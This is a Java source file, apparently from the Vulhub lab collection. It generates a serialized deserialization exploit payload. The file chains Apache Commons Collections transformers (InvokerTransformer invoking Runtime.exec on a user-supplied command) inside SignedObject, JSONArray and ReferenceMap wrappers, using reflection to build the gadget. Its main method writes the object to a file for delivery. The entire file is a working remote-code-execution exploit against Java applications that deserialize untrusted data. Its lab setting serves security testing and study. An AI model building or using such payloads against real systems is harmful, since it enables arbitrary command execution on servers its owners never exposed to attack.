package org.vulhub;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamException;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.concurrent.ConcurrentSkipListSet;
import java.util.concurrent.CopyOnWriteArraySet;

import net.sf.json.JSONArray;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.collection.AbstractCollectionDecorator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.ReferenceMap;
import org.apache.commons.collections.set.ListOrderedSet;

public class Payload implements Serializable {

    private Serializable payload;

    private Payload(String cmd) throws Exception {

        this.payload = this.setup(cmd);

    }

    private Serializable setup(String cmd) throws Exception {
        final String[] execArgs = new String[] { cmd };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,
                        Class[].class }, new Object[] { "getRuntime",
                        new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        execArgs), new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array2 = (Object[]) f2.get(innimpl);

        Object node = array2[0];
        if (node == null) {
            node = array2[1];
        }

        Field keyField = null;
        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception e) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField(
                    "key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        PublicKey publicKey = keyPair.getPublic();

        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject payload = new SignedObject(map, privateKey, signature);
        JSONArray array = new JSONArray();

        array.add("asdf");

        ListOrderedSet set = new ListOrderedSet();
        Field f1 = AbstractCollectionDecorator.class
                .getDeclaredField("collection");
        f1.setAccessible(true);
        f1.set(set, array);

        DummyComperator comp = new DummyComperator();
        ConcurrentSkipListSet csls = new ConcurrentSkipListSet(comp);
        csls.add(payload);

        CopyOnWriteArraySet a1 = new CopyOnWriteArraySet();
        CopyOnWriteArraySet a2 = new CopyOnWriteArraySet();

        a1.add(set);
        Container c = new Container(csls);
        a1.add(c);

        a2.add(csls);
        a2.add(set);

        ReferenceMap flat3map = new ReferenceMap();
        flat3map.put(new Container(a1), "asdf");
        flat3map.put(new Container(a2), "asdf");

        return flat3map;
    }

    private Object writeReplace() throws ObjectStreamException {
        return this.payload;
    }

    private static class Container implements Serializable {

        private Object o;

        private Container(Object o) {
            this.o = o;
        }

        private Object writeReplace() throws ObjectStreamException {
            return o;
        }

    }

    static class DummyComperator implements Comparator, Serializable {

        public int compare(Object arg0, Object arg1) {
            // TODO Auto-generated method stub
            return 0;
        }

        private Object writeReplace() throws ObjectStreamException {
            return null;
        }

    }

    public static void main(String args[]) throws Exception{

        if(args.length != 2){
            System.out.println("java -jar payload.jar outfile cmd");
            System.exit(0);
        }

        String cmd = args[1];
        FileOutputStream out = new FileOutputStream(args[0]);

        Payload pwn = new Payload(cmd);
        ObjectOutputStream oos = new ObjectOutputStream(out);
        oos.writeObject(pwn);
        oos.flush();
        out.flush();


    }

}